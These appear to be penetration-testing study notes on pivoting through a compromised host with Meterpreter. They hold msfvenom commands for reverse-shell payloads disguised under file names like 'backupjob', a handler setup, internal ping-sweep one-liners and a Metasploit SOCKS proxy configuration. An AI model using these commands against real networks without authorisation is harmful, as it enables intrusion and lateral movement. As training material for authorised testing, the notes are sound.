- what if we wanted to connect our meterpreter shell to the pivot host, then perform enumeration scans through the pivot host without using ssh
    
    - want to keep the capabilities of the meterpreter session without relying on ssh port forwarding (we won’t always have ssh)
    
  
# Creating Payload for Ubuntu Pivot Host
```JavaScript
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> -f elf -o backupjob LPORT=<IP>
```
- payload is subject to change
- for windows
```JavaScript
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> -f exe -o backupscript.exe LPORT=<port>
```
# Configuring & Starting the multi/handler
```JavaScript
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```
- payload is subject to change
- for windows
    
    - windows/x64/meterpreter/reverse_tcp
    
  
# Ping Sweep
## Meterpreter Session on Pivot Host
- from the meterpreter session, you can use the ping_sweep module
```JavaScript
run post/multi/gather/ping_sweep RHOSTS=<Internal_CIDR>
```
- for their example they used 172.16.5.0/23
  
## Ping Sweep For Loop on Linux Pivot Host
```JavaScript
for i in {1..254} ;do (ping -c 1 <IP>.$i | grep "bytes from" &) ;done
```
- IP would be just the first 3 octets (at least in a /24 network)
  
## Ping Sweep For Loop Using CMD
```JavaScript
for /L %i in (1 1 254) do ping <IP>.%i -n 1 -w 100 | find "Reply"
```
- IP would be just the first 3 octets (at least in a /24 network)
  
## Ping Sweep Using Powershell
```JavaScript
1..254 | % {"<IP>.$($_): $(Test-Connection -count 1 -comp <IP>.$($_) -quiet)"}
```
- IP would be just the first 3 octets (at least in a /24 network)
  
## Note for Ping Sweep
- may fail the first time because of the time it takes to build the arp cache
    
    - make sure to run ping sweeps twice
    
  
## Configuring MSF’s SOCKS Proxy
```JavaScript
use auxiliary/server/socks_proxy
set SRVPORT 9050
set version 4a
run
```
![image 195.png](../assets/Meterpreter%20Tunneling%20%26%20Port%20Forwarding/image%20195.png)
- proxy runs in the background
- depending on the version, we may need to change from socks4 to socks5 in proxychains.conf
  
### Confirm Proxy Server is Running
```JavaScript
msf6 auxiliary(server/socks_proxy) > jobs
```
![image 1 144.png](../assets/Meterpreter%20Tunneling%20%26%20Port%20Forwarding/image%201%20144.png)